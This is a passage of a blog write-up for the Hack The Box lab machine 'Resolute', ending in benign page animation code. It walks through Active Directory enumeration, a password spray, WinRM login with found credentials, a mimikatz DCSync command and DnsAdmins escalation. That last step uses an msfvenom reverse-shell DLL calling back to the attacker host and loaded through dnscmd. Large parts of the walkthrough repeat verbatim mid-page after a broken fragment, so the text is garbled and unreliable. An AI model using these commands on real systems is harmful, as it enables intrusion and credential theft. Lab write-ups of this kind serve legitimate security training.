rid:[0x19c9]</code><br><code>user:[abigail] rid:[0x19ca]</code><br><code>user:[marcus] rid:[0x19cb]</code><br><code>user:[sally] rid:[0x19cc]</code><br><code>user:[fred] rid:[0x19cd]</code><br><code>user:[angela] rid:[0x19ce]</code><br><code>user:[felicia] rid:[0x19cf]</code><br><code>user:[gustavo] rid:[0x19d0]</code><br><code>user:[ulf] rid:[0x19d1]</code><br><code>user:[stevie] rid:[0x19d2]</code><br><code>user:[claire] rid:[0x19d3]</code><br><code>user:[paulo] rid:[0x19d4]</code><br><code>user:[steve] rid:[0x19d5]</code><br><code>user:[annette] rid:[0x19d6]</code><br><code>user:[annika] rid:[0x19d7]</code><br><code>user:[per] rid:[0x19d8]</code><br><code>user:[claude] rid:[0x19d9]</code><br><code>user:[melanie] rid:[0x2775]</code><br><code>user:[zach] rid:[0x2776]</code><br><code>user:[simon] rid:[0x2777]</code><br><code>user:[naoki] rid:[0x2778]</code><br>&nbsp;</p><p>And groups</p><p><code>rpcclient $&gt; enumdomgroups</code><br><code>group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]</code><br><code>group:[Domain Admins] rid:[0x200]</code><br><code>group:[Domain Users] rid:[0x201]</code><br><code>group:[Domain Guests] rid:[0x202]</code><br><code>group:[Domain Computers] rid:[0x203]</code><br><code>group:[Domain Controllers] rid:[0x204]</code><br><code>group:[Schema Admins] rid:[0x206]</code><br><code>group:[Enterprise Admins] rid:[0x207]</code><br><code>group:[Group Policy Creator Owners] rid:[0x208]</code><br><code>group:[Read-only Domain Controllers] rid:[0x209]</code><br><code>group:[Cloneable Domain Controllers] rid:[0x20a]</code><br><code>group:[Protected Users] rid:[0x20d]</code><br><code>group:[Key Admins] rid:[0x20e]</code><br><code>group:[Enterprise Key Admins] rid:[0x20f]</code><br><code>group:[DnsUpdateProxy] rid:[0x44e]</code><br><code>group:[Contractors] rid:[0x44f]</code><br>&nbsp;</p><p>Running enum4linux we get this</p><p>index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko&nbsp;&nbsp;&nbsp;&nbsp;Name: Marko Novak&nbsp;&nbsp;&nbsp;&nbsp;Desc: Account created. Password set to Welcome123!</p><p>&nbsp;</p><p>index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan&nbsp;&nbsp;&nbsp;&nbsp;Name: Ryan Bertrand&nbsp;&nbsp;&nbsp;&nbsp;Desc: (null)<br>&nbsp;</p><p>Every other user is set to null for names so I imagine these are the two actual users. Marko login does not work unforutnately.</p><p>&nbsp;</p><p>Minimum password length: 7</p><p>Account Lockout Threshold: None - Accounts will not get locked out</p><p>&nbsp;</p><p>Ryan is in a special group</p><p>'Contractors' (RID: 1103) has member: MEGABANK\ryan<br>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge"><strong><u>Password Spray</u></strong></span></p><p>Using egrep I pulled all passwords from rockyou.txt that are a minimum of 7 characters and moved them to a new wordlist to attempt a password spray</p><p><code>egrep '.{7,}' /usr/share/wordlists/rockyou.txt &gt; rockyou.txt</code></p><p>then ran it against ryan and marko</p><p><code>crackmapexec smb 10.10.10.169 -u newusers.txt -p rockyou.txt | grep +</code></p><p>&nbsp;</p><p>Didnt get anything with the spray.</p><p>&nbsp;</p><p>Looking back at marko his password hasnt changed so we should be able to use Welcome123!</p><p>rpcclient $&gt; queryuser 0x457<br>&nbsp;&nbsp;&nbsp;&nbsp;User Name &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;marko<br>&nbsp;&nbsp;&nbsp;&nbsp;Full Name &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Marko Novak<br>&nbsp;&nbsp;&nbsp;&nbsp;Home Drive &nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Dir Drive &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Profile Path:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Logon Script:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Description :&nbsp;&nbsp;&nbsp;&nbsp;Account created. Password set to Welcome123!<br>&nbsp;&nbsp;&nbsp;&nbsp;Workstations:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Comment &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Remote Dial :<br>&nbsp;&nbsp;&nbsp;&nbsp;Logon Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Wed, 31 Dec 1969 19:00:00 EST<br>&nbsp;&nbsp;&nbsp;&nbsp;Logoff Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;Wed, 31 Dec 1969 19:00:00 EST<br>&nbsp;&nbsp;&nbsp;&nbsp;Kickoff Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Wed, 13 Sep 30828 22:48:05 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password last set Time &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Fri, 27 Sep 2019 09:17:15 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password can change Time :&nbsp;&nbsp;&nbsp;&nbsp;Sat, 28 Sep 2019 09:17:15 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password must change Time:&nbsp;&nbsp;&nbsp;&nbsp;Wed, 13 Sep 30828 22:48:05 EDT</p><p>&nbsp;</p><p>Before this I ran this with the domain name megabank.local instead of the IP and it failed. I used guided mode and saw password spraying was the proper path so I tried the IP and it worked. Simple mistake on my end.</p><figure class="image"><img style="aspect-ratio:1272/453;" src="../img/posts/2024-05-24-Resolute(HTB)/01-56bdeef38a.png" width="1272" height="453"></figure><p>&nbsp;</p><p>melanie:Welcome123!</p><p>&nbsp;</p><p>We can remote in with evil-winrm</p><p>evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge"><strong><u>Bloodhound</u></strong></span></p><p>After taking a while to get bloodhound working I used bloodhound.py and I was finally able to get working data.</p><p>&nbsp;</p><p>This is our path to Admin</p><figure class="image image-style-block-align-left image_resized" style="width:60.55%;"><img style="aspect-ratio:1039/1101;" src="../img/posts/2024-05-24-Resolute(HTB)/02-b498e12538.png" width="1039" height="1101"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can PS remote into Resolute</p><p>&nbsp;</p><pre><code class="language-text-plain">$SecPassword = ConvertTo-SecureString 'Welcome123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('MEGABANK.LOCAL\melanie', $SecPassword)</code></pre><p><code>$session = New-PSSession -ComputerName RESOLUTE.MEGABANK.LOCAL -Credential $Cred</code></p><p><code>Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}</code></p><p>&nbsp;</p><p>Confirm it worked with <code>Get-ChildItem Env:</code> we see the computer name is Resolute</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:547/203;" src="../img/posts/2024-05-24-Resolute(HTB)/03-8372d509e9.png" width="547" height="203"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Next we can perform a DCSync attack with mimikatz</p><p>&nbsp;</p><p><code>lsadump::dcsync /domain:MEGABANK.LOCAL /user:Administrator</code><br>&nbsp;</p><p>I tried to get mimikatz on the machine by making mimikatz undetected, disabling av, nothing is working. I realized we have another user, Ryan.&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>I tried doing everything I could imagine to find creds for Ryan but had no luck. I decided to look up a guide. The files were hidden inside a hidden directory hiding everything inside the directory as well.<br><br>Using ls -force we can find the hidden folders in the root of the C drive.</p><p>&nbsp;</p><p>C:\PStranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</p><p>&nbsp;</p><p>In the history file we find creds for ryan</p><p>ryan Serv3r4Admin4cc123!<br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Getting a hint from guided mode after searching for a couple hours and finding nothing the attack vector is the DNS Admin group. I saw this when I ran whoami /all but forgot after going out to dinner and coming back.</p><p>&nbsp;</p><p>DNS admin group can set a DLL file to run when DNS starts. We create a dll using msfvenom</p><p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=443 -f dll -o rev.dll</code></p><p><br>I tried uploading the dll but defender blocks it. Thankfully we can actually run this from our smbshare without uploading it. For some reason if you map the drive though it will not work and you will not get a shell(this took me a very long time to figure out)</p><p>&nbsp;</p><p>Setting the malcious DLL(Do not map the drive or it fails)</p><p><code>dnscmd.exe /config /serverlevelplugindll \\10.10.14.22\s\rev.dll</code></p><p>&nbsp;</p><p>Stop and Start DNS</p><p><code>sc.exe \\resolute stop dns</code><br><code>sc.exe \\resolute start dns</code><br>&nbsp;</p><p>And we get a reverse shell</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:532/222;" src="../img/posts/2024-05-24-Resolute(HTB)/04-b097ccf123.png" width="532" height="222"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p></body>gt; queryuser 0x457<br>&nbsp;&nbsp;&nbsp;&nbsp;User Name &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;marko<br>&nbsp;&nbsp;&nbsp;&nbsp;Full Name &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Marko Novak<br>&nbsp;&nbsp;&nbsp;&nbsp;Home Drive &nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Dir Drive &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Profile Path:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Logon Script:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Description :&nbsp;&nbsp;&nbsp;&nbsp;Account created. Password set to Welcome123!<br>&nbsp;&nbsp;&nbsp;&nbsp;Workstations:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Comment &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Remote Dial :<br>&nbsp;&nbsp;&nbsp;&nbsp;Logon Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Wed, 31 Dec 1969 19:00:00 EST<br>&nbsp;&nbsp;&nbsp;&nbsp;Logoff Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;Wed, 31 Dec 1969 19:00:00 EST<br>&nbsp;&nbsp;&nbsp;&nbsp;Kickoff Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Wed, 13 Sep 30828 22:48:05 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password last set Time &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Fri, 27 Sep 2019 09:17:15 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password can change Time :&nbsp;&nbsp;&nbsp;&nbsp;Sat, 28 Sep 2019 09:17:15 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password must change Time:&nbsp;&nbsp;&nbsp;&nbsp;Wed, 13 Sep 30828 22:48:05 EDT</p><p>&nbsp;</p><p>Before this I ran this with the domain name megabank.local instead of the IP and it failed. I used guided mode and saw password spraying was the proper path so I tried the IP and it worked. Simple mistake on my end.</p><figure class="image"><img style="aspect-ratio:1272/453;" src="../img/posts/2024-05-24-Resolute(HTB)/01-56bdeef38a.png" width="1272" height="453"></figure><p>&nbsp;</p><p>melanie:Welcome123!</p><p>&nbsp;</p><p>We can remote in with evil-winrm</p><p>evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge"><strong><u>Bloodhound</u></strong></span></p><p>After taking a while to get bloodhound working I used bloodhound.py and I was finally able to get working data.</p><p>&nbsp;</p><p>This is our path to Admin</p><figure class="image image-style-block-align-left image_resized" style="width:60.55%;"><img style="aspect-ratio:1039/1101;" src="../img/posts/2024-05-24-Resolute(HTB)/02-b498e12538.png" width="1039" height="1101"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can PS remote into Resolute</p><p>&nbsp;</p><pre><code class="language-text-plain">$SecPassword = ConvertTo-SecureString 'Welcome123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('MEGABANK.LOCAL\melanie', $SecPassword)</code></pre><p><code>$session = New-PSSession -ComputerName RESOLUTE.MEGABANK.LOCAL -Credential $Cred</code></p><p><code>Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}</code></p><p>&nbsp;</p><p>Confirm it worked with <code>Get-ChildItem Env:</code> we see the computer name is Resolute</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:547/203;" src="../img/posts/2024-05-24-Resolute(HTB)/03-8372d509e9.png" width="547" height="203"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Next we can perform a DCSync attack with mimikatz</p><p>&nbsp;</p><p><code>lsadump::dcsync /domain:MEGABANK.LOCAL /user:Administrator</code><br>&nbsp;</p><p>I tried to get mimikatz on the machine by making mimikatz undetected, disabling av, nothing is working. I realized we have another user, Ryan.&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>I tried doing everything I could imagine to find creds for Ryan but had no luck. I decided to look up a guide. The files were hidden inside a hidden directory hiding everything inside the directory as well.<br><br>Using ls -force we can find the hidden folders in the root of the C drive.</p><p>&nbsp;</p><p>C:\PStranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</p><p>&nbsp;</p><p>In the history file we find creds for ryan</p><p>ryan Serv3r4Admin4cc123!<br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Getting a hint from guided mode after searching for a couple hours and finding nothing the attack vector is the DNS Admin group. I saw this when I ran whoami /all but forgot after going out to dinner and coming back.</p><p>&nbsp;</p><p>DNS admin group can set a DLL file to run when DNS starts. We create a dll using msfvenom</p><p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=443 -f dll -o rev.dll</code></p><p><br>I tried uploading the dll but defender blocks it. Thankfully we can actually run this from our smbshare without uploading it. For some reason if you map the drive though it will not work and you will not get a shell(this took me a very long time to figure out)</p><p>&nbsp;</p><p>Setting the malcious DLL(Do not map the drive or it fails)</p><p><code>dnscmd.exe /config /serverlevelplugindll \\10.10.14.22\s\rev.dll</code></p><p>&nbsp;</p><p>Stop and Start DNS</p><p><code>sc.exe \\resolute stop dns</code><br><code>sc.exe \\resolute start dns</code><br>&nbsp;</p><p>And we get a reverse shell</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:532/222;" src="../img/posts/2024-05-24-Resolute(HTB)/04-b097ccf123.png" width="532" height="222"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+    </article>
+
+<script>
+        // ---------- Particle background ----------
+        (function () {
+            const canvas = document.getElementById('bg-canvas');
+            const ctx = canvas.getContext('2d');
+            const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+            const mouse = { x: null, y: null };
+            let particles = [];
+            let w = 0, h = 0;
+
+            function resize() {
+                const dpr = Math.min(window.devicePixelRatio || 1, 2);
+                w = window.innerWidth;
+                h = window.innerHeight;
+                canvas.width = w * dpr;
+                canvas.height = h * dpr;
+                canvas.style.width = w + 'px';
+                canvas.style.height = h + 'px';
+                ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+                seed();
+            }
+
+            function seed() {
+                const count = Math.min(90, Math.floor((w * h) / 16000));
+                particles = [];
+                for (let i = 0; i < count; i++) {
+                    particles.push({
+                        x: Math.random() * w,
+                        y: Math.random() * h,
+                        vx: (Math.random() - 0.5) * 0.35,
+                        vy: (Math.random() - 0.5) * 0.35,
+                        r: Math.random() * 1.5 + 0.7
+                    });
+                }
+            }
+
+            function draw() {
+                ctx.clearRect(0, 0, w, h);
+
+                for (const p of particles) {
+                    p.x += p.vx;
+                    p.y += p.vy;
+
+                    if (p.x < -20) p.x = w + 20;
+                    if (p.x > w + 20) p.x = -20;
+                    if (p.y < -20) p.y = h + 20;
+                    if (p.y > h + 20) p.y = -20;
+
+                    if (mouse.x !== null) {
+                        const dx = p.x - mouse.x;
+                        const dy = p.y - mouse.y;
+                        const d = Math.hypot(dx, dy);
+                        if (d < 120 && d > 0.001) {
+                            const f = (1 - d / 120) * 0.5;
+                            p.x += (dx / d) * f;
+                            p.y += (dy / d) * f;
+                        }
+                    }
+                }
+
+                for (let i = 0; i < particles.length; i++) {
+                    const a = particles[i];
+                    for (let j = i + 1; j < particles.length; j++) {
+                        const b = particles[j];
+                        const d = Math.hypot(a.x - b.x, a.y - b.y);
+                        if (d < 110) {
+                            ctx.strokeStyle = 'rgba(94, 234, 212, ' + (0.14 * (1 - d / 110)).toFixed(3) + ')';
+                            ctx.lineWidth = 1;
+                            ctx.beginPath();
+                            ctx.moveTo(a.x, a.y);
+                            ctx.lineTo(b.x, b.y);
+                            ctx.stroke();
+                        }
+                    }
+                    if (mouse.x !== null) {
+                        const d = Math.hypot(a.x - mouse.x, a.y - mouse.y);
+                        if (d < 140) {
+                            ctx.strokeStyle = 'rgba(124, 140, 248, ' + (0.18 * (1 - d / 140)).toFixed(3) + ')';
+                            ctx.lineWidth = 1;
+                            ctx.beginPath();
+                            ctx.moveTo(a.x, a.y);
+                            ctx.lineTo(mouse.x, mouse.y);
+                            ctx.stroke();
+                        }
+                    }
+                }
+
+                for (const p of particles) {
+                    ctx.fillStyle = 'rgba(232, 237, 242, 0.5)';
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            function loop() {
+                if (!document.hidden) draw();
+                requestAnimationFrame(loop);
+            }
+
+            window.addEventListener('resize', resize);
+            window.addEventListener('mousemove', function (e) {
+                mouse.x = e.clientX;
+                mouse.y = e.clientY;
+            });
+            window.addEventListener('mouseleave', function () {
+                mouse.x = null;
+                mouse.y = null;
+            });
+
+            resize();
+            if (reduced) {
+                draw();
+            } else {
+                requestAnimationFrame(loop);
+            }
+        })();
+    </script>
+</body></html>
